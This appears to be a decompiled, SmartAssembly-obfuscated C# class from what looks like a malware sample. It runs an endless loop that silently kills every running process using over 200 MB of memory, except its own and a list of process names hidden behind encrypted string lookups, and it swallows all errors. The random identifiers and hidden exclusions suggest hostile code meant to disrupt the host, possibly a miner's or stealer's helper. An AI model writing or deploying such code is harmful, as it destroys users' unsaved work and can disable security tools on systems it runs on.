using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fAuBSMaVICral;

public static class JGYhhaJwhCT
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ffpYyQcrWtZZ()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107460552)) && !process.ProcessName.Contains(getString_0(107460543)) && !process.ProcessName.Contains(getString_0(107459990)) && !process.ProcessName.Contains(getString_0(107459981)) && !process.ProcessName.Contains(getString_0(107460000)) && !process.ProcessName.Contains(getString_0(107459955)) && !process.ProcessName.Contains(getString_0(107459974)) && !process.ProcessName.Contains(getString_0(107459929)) && !process.ProcessName.Contains(getString_0(107459916)) && !process.ProcessName.Contains(getString_0(107459935)) && !process.ProcessName.Contains(getString_0(107459914)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static JGYhhaJwhCT()
	{
		Strings.CreateGetStringDelegate(typeof(JGYhhaJwhCT));
	}
}
